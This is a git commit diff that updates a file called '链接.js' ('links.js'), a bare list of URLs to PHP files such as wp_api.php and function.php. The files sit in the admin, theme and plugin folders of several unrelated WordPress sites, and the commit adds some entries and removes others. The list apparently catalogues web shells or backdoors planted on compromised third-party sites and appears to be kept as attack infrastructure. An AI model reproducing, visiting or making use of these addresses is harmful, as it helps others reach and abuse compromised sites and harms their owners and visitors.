e5e31084f98472272e37b24b44d1c0766a86c4f8
KeikoHanasaka <cqzzvip@outlook.com>
2025-07-14 17:25:26 +0800

    Update 链接.js

--- 链接.js
+++ 链接.js
@@ -1,4 +1,4 @@
-https://thesidewaystheory.com.au/wp-admin/wp-api.php
+https://thesidewaystheory.com.au/wp-admin/wp_api.php
+http://kvinta.tv/wp-content/themes/pridmag/wp_api.php
+https://sc.smartconcept.ae/wp-content/plugins/function.php
 https://identity.com.bd/wp_api.php
-https://mimbuzz.me/wp-admin/maint/wp-api.php
-http://www.opalescentmotion.com/wp_api.php
